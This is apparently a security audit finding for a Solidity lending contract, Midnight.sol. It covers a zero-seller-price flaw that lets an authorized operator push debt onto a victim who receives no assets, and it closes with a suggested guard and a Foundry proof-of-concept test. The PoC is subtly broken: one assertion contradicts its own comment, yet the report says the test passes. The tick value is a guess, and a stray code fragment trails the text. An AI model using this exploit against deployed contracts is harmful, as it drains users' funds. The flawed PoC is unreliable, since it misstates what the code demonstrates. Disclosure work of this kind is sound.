### Title
Zero-sellerPrice buy-offer take forces victim into debt with zero asset receipt - (`src/Midnight.sol`)

### Summary

When a buy offer's `offerPrice` exactly equals the market's `settlementFee`, `sellerPrice` computes to zero without reverting (Solidity 0.8 underflow only triggers when `offerPrice < settlementFee`). An attacker who holds `isAuthorized[victim][attacker] = true` can call `take()` with `taker = victim`, causing `sellerAssets = 0` while `sellerDebtIncrease = units`, so the victim accrues real debt and receives nothing. The only existing guard — the post-take health check — does not prevent this; it merely requires the victim's position to remain healthy, which it can if the victim already holds collateral.

### Finding Description

**Exact code path** — `src/Midnight.sol` lines 358–364 and 382–414:

```solidity
uint256 offerPrice    = TickLib.tickToPrice(offer.tick);          // e.g. 1e12 (tick ≈ 3)
uint256 _settlementFee = settlementFee(id, timeToMaturity);       // e.g. 1e12 (1 CBP)
uint256 sellerPrice   = offer.buy ? offerPrice - _settlementFee   // = 0, no revert
                                  : offerPrice;
uint256 sellerAssets  = offer.buy ? units.mulDivDown(sellerPrice, WAD)  // = 0
                                  : units.mulDivUp(sellerPrice, WAD);
...
uint256 sellerDebtIncrease = units - sellerCreditDecrease;        // = units (no credit)
...
sellerPos.debt += UtilsLib.toUint128(sellerDebtIncrease);         // victim debt += units
...
SafeTransferLib.safeTransferFrom(..., receiver, sellerAssets);    // transfers 0
``` [1](#0-0) [2](#0-1) 

**Root cause** — The comment at line 331 states "Taking buy offers with price < settlement fee will revert," relying on Solidity 0.8 underflow. But `offerPrice == settlementFee` produces `sellerPrice = 0` silently. No explicit guard exists for this boundary case. [3](#0-2) 

**Attacker-controlled inputs:**
- `offer.buy = true`, `offer.tick` chosen so `tickToPrice(tick) == _settlementFee` (both are multiples of `CBP = 1e12`; the minimum non-zero tick price is `1e12` at tick ≈ 3, matching a 1-CBP settlement fee)
- `taker = victim` (attacker holds `isAuthorized[victim][attacker] = true`)
- `units` = any positive value

**Why existing checks fail:**
1. `require(taker == msg.sender || isAuthorized[taker][msg.sender])` — passes because attacker is authorized.
2. Solidity 0.8 underflow — only fires when `offerPrice < _settlementFee`; equality is silent.
3. `require(isHealthy(...))` at line 476 — only checks post-take health; it does not verify `sellerAssets > 0` when `sellerDebtIncrease > 0`. [4](#0-3) [5](#0-4) 

The test suite's own comment at lines 1201–1209 documents that a buy offer at price 0 with non-zero fee reverts by underflow, but does not cover the `offerPrice == settlementFee` boundary: [6](#0-5) 

`MIN_SELLER_PRICE = 0.5e18` is only a test-side assumption, not enforced in the contract: [7](#0-6) 

### Impact Explanation

The victim (seller/taker) accrues `sellerDebtIncrease = units` debt and receives `sellerAssets = 0` loan tokens. All `buyerAssets` flow to `claimableSettlementFee`. The attacker (buyer/maker) simultaneously gains `units` credit at a cost of only `units * settlementFee / WAD` (e.g., `units / 1e6` for a 1-CBP fee). After the victim is forced to repay to avoid liquidation, the attacker can withdraw the credit — effectively extracting the victim's loan tokens at near-zero cost. The victim's collateral is also placed at liquidation risk if oracle prices move.

### Likelihood Explanation

**Preconditions:**
1. Attacker holds `isAuthorized[victim][attacker] = true` — requires the victim to have authorized the attacker (e.g., as an automated operator or via `EcrecoverAuthorizer.setIsAuthorized` with a signed message).
2. A tick exists where `tickToPrice(tick) == _settlementFee` — both quantities are multiples of `CBP = 1e12`; the minimum non-zero tick price (`1e12`) matches a 1-CBP fee, making this concretely achievable.
3. Victim has sufficient collateral for the health check to pass.

The attack is repeatable and cheap. Any malicious or compromised operator can execute it. [8](#0-7) [9](#0-8) [10](#0-9) 

### Recommendation

Add an explicit guard immediately after computing `sellerPrice` in `take()`:

```solidity
require(!offer.buy || sellerPrice > 0, BuyOfferSellerPriceZero());
```

This closes the gap between the documented intent ("buy offers with price ≤ settlement fee must not proceed") and the actual behavior (only `price < fee` reverts via underflow). [11](#0-10) 

### Proof of Concept

```solidity
// Foundry unit test
function testZeroSellerPriceBuyOffer() public {
    // Setup: settlement fee = 1 CBP = 1e12
    midnight.touchMarket(market);
    midnight.setMarketSettlementFee(id, 1, 1e12);

    // Find tick where tickToPrice(tick) == 1e12 (tick ≈ 3)
    uint256 attackTick = 3; // adjust to first tick with price == 1e12
    assertEq(TickLib.tickToPrice(attackTick), 1e12);

    // Attacker creates buy offer at that tick
    Offer memory attackOffer = lenderOffer;
    attackOffer.maker = attacker;
    attackOffer.buy = true;
    attackOffer.tick = attackTick;
    attackOffer.maxUnits = type(uint256).max;

    // Victim has collateral (health check must pass)
    uint256 units = 1e18;
    collateralize(market, victim, units);

    // Victim authorizes attacker
    vm.prank(victim);
    midnight.setIsAuthorized(attacker, true, victim);

    uint256 debtBefore = midnight.debtOf(id, victim);

    // Attacker calls take with taker = victim
    vm.prank(attacker);
    deal(address(loanToken), attacker, units); // pay tiny buyerAssets
    (uint256 buyerAssets, uint256 sellerAssets) = midnight.take(
        attackOffer, hex"", units, victim, victim, address(0), hex""
    );

    // Assertions
    assertEq(sellerAssets, 0, "victim received zero assets");
    assertGt(midnight.debtOf(id, victim), debtBefore, "victim debt increased");
    assertEq(buyerAssets, sellerAssets, "all buyer payment went to fee"); // buyerAssets > 0, sellerAssets == 0
    assertGt(midnight.claimableSettlementFee(address(loanToken)), 0, "fee accrued");
    assertGt(midnight.creditOf(id, attacker), 0, "attacker got credit for free");
}
```

Expected: test passes, demonstrating victim accrues `units` debt with `sellerAssets = 0`.

            authorization.authorizer,
            authorization.authorized,
